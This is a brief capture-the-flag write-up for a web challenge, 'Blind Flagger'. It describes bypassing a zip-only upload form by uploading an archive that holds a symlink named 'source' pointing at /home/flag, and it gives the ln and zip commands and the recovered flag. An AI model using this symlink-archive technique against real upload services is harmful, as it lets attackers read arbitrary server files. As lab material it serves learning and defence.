Challenge Name: Blind Flagger
Level: Hard
Category: Web


robots.txt :

	Disallow: /uploads
	Disallow: /home/flag

Uploading only Zip files :

	Archive:  uploads/738d96baa3dffad36be4e2b998e84d16.zip
	"Error: source file was not found , please try again."

inside zip file file, tried many extensions but without result so tried 'source' as file name inside the zip and it worked :) :

just create our symlink trick and go head :

```sh
ln -s /home/flag source
zip --symlinks 0.zip source
```

	Archive:  uploads/738d96baa3dffad36be4e2b998e84d16.zip
	$ cat 738d96baa3dffad36be4e2b998e84d16/source

http://.../uploads/738d96baa3dffad36be4e2b998e84d16/source : FLAG

__FLAG{zIp_aNd_sYmLinkS_arE_S0_rIskY}__